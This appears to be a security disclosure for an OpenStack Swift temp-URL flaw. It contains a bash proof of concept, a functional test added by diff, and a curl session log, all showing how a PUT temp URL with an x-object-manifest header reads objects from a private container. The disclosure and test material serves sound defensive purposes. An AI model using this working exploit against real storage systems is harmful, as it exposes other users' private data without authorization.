# Multi-part file

#!/bin/bash
# resetswift
set -e
echo "password" > secret
swift upload private secret
swift post -H 'x-account-meta-temp-url-key: mykey'
# create a container for people to upload stuff too
swift post public
# attacker: "yes hello, can I have a safe place to upload some of my data?"
PUT_TEMPURL_SIG="$(swift tempurl PUT 60 /v1/AUTH_test/public/your-thing mykey)"
curl -XPUT -H 'x-object-manifest: private/secret' "http://localhost:8080${PUT_TEMPURL_SIG}" -d ''
# attacker: "oh yes, that data I just uploaded - can I download it please?"
PUT_TEMPURL_SIG="$(swift tempurl GET 60 /v1/AUTH_test/public/your-thing mykey)"
# attacker: only... it's not *MY* data - trolrolrololollolo
echo ""
echo "**************************************"
curl "http://localhost:8080${PUT_TEMPURL_SIG}"
echo ""
echo "**************************************"

######### Git diff of second part

diff --git a/test/functional/tests.py b/test/functional/tests.py
index 95f168e..e721380 100644
--- a/test/functional/tests.py
+++ b/test/functional/tests.py
@@ -2732,6 +2732,44 @@ class TestTempurl(Base):
         self.assert_(new_obj.info(parms=put_parms,
                                   cfg={'no_auth_token': True}))
 
+    def test_PUT_manifest_access(self):
+        new_obj = self.env.container.file(Utils.create_name())
+
+        # give out a signature which allows a PUT to new_obj
+        expires = int(time.time()) + 86400
+        sig = self.tempurl_sig(
+            'PUT', expires, self.env.conn.make_path(new_obj.path),
+            self.env.tempurl_key)
+        put_parms = {'temp_url_sig': sig,
+                     'temp_url_expires': str(expires)}
+
+        # use signature to create manifest pointing to some random container
+        new_obj.write('', {
+            'x-object-manifest': '%s/foo' % 'some_random_container'
+        }, parms=put_parms, cfg={'no_auth_token': True})
+
+        # since PUT tempurl responds to head, we can check the status
+        try:
+            new_obj.info(parms=put_parms, cfg={'no_auth_token': True})
+        except ResponseError as e:
+            # ok, so we know *that* container does not exist
+            self.assertEqual(e.status, 404)
+
+        # create some other container
+        other_container = self.env.account.container(Utils.create_name())
+        if not other_container.create():
+            raise ResponseError(self.conn.response)
+
+        # now use the same signature to probe around until we find a container
+        new_obj.write('', {
+            'x-object-manifest': '%s/foo' % other_container.name
+        }, parms=put_parms, cfg={'no_auth_token': True})
+        info = new_obj.info(parms=put_parms, cfg={'no_auth_token': True})
+        # ok, and now that we know that container exists we can probe around
+        # with some more prefixes and watch content-length to do a binary
+        # search for the object names in the container
+        self.assertTrue(info)
+
     def test_HEAD(self):
         expires = int(time.time()) + 86400
         sig = self.tempurl_sig(

################### Part 3
# Create object in container with secrets
$ curl -i -XPUT -H'x-auth-token: AUTH_tkbfc02e65fe184fa88500de6e9293dced' http://127.0.0.1:8080/v1/AUTH_test/secrets/foo.txt --data "12345"
HTTP/1.1 201 Created
Last-Modified: Mon, 27 Apr 2015 18:34:45 GMT
Content-Length: 0
Etag: 827ccb0eea8a706c4c34a16891f84e7b
Content-Type: text/html; charset=UTF-8
X-Trans-Id: txdb50279b32684c198a1e5-00553e8144
Date: Mon, 27 Apr 2015 18:34:44 GMT

# Create PUT temp URL, and create DLO pointing to "secret" container.
$ curl -i -XPUT http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt\?temp_url_sig\=b3b1a841a9262bbaa6eb546e5c2054be17377be5\;temp_url_expires\=1430160082 -H'X-Object-Manifest: secrets/f' -H'Content-Length: 0'
HTTP/1.1 201 Created
Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT
Content-Length: 0
Etag: d41d8cd98f00b204e9800998ecf8427e
Content-Type: text/html; charset=UTF-8
X-Trans-Id: txf89037608c7a461f9f6f1-00553e81d3
Date: Mon, 27 Apr 2015 18:37:07 GMT

# GET secrets using temp URL
$ curl -i http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt\?temp_url_sig\=25d3740e42b56cbbaae15094bfc2a4f3ce3def86\;temp_url_expires\=1430160141
HTTP/1.1 200 OK
Content-Length: 5
Accept-Ranges: bytes
X-Object-Manifest: container_b/f
Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT
Etag: "1f32aa4c9a1d2ea010adcf2348166a04"
X-Timestamp: 1430159827.15679
Content-Type: text/plain
Content-Disposition: attachment; filename="uhoh.txt"; filename*=UTF-8''uhoh.txt
X-Trans-Id: txbfe86e01cdef48caaeac2-00553e81ea
Date: Mon, 27 Apr 2015 18:37:30 GMT

12345%
